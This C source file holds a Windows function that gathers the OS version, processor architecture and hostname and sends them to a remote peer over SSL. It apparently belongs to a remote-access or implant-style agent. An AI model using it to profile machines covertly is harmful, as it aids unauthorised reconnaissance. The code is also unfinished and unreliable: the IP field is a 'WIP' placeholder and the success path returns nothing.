#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <openssl/ssl.h>

#include "send_receive.h"

#pragma comment(lib, "IPHLPAPI.lib")

void * systeminfo(SSL* ssl)
{
    OSVERSIONINFOEX osVersionInfo;
    SYSTEM_INFO systemInfo;
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hostnameLen = sizeof(hostname);

    // Get operating system version information
    ZeroMemory(&osVersionInfo, sizeof(OSVERSIONINFOEX));
    osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    if (!GetVersionEx((OSVERSIONINFO*)&osVersionInfo)) {
        send_data(ssl, "Failed to get OS Version");
        return NULL;
    }
    // Get system information
    GetSystemInfo(&systemInfo);

    // Get host name
    if (!GetComputerNameA(hostname, &hostnameLen)) {
        send_data(ssl, "Failed to get computer name");
        return NULL;
    }
    // Get IP addresses
    IP_ADAPTER_ADDRESSES* adapterAddresses = NULL;
    ULONG bufferSize = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, adapterAddresses, &bufferSize);
    adapterAddresses = (IP_ADAPTER_ADDRESSES*)malloc(bufferSize);
    // check if it was successful
    if (adapterAddresses == NULL) {
        send_data(ssl, "Failed to get allocate memory for adapter address");
        return NULL;
    }

    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, adapterAddresses, &bufferSize);

    char ipAddresses[256] = ""; // Initialize an empty string to store IP addresses

    // Get platform information
    char platformInfo[1024];
    sprintf(platformInfo, "System = {%s}\nVersion = {%d.%d}\nProcessor Architecture = {%d}\nHostname = {%s}\nIP Address = {%s}\n",
            osVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT ? "Windows NT" : "Windows",
            osVersionInfo.dwMajorVersion, osVersionInfo.dwMinorVersion,
            systemInfo.wProcessorArchitecture, hostname, "WIP");

    puts("Got system info");
    send_data(ssl, platformInfo);

    free(adapterAddresses);
}
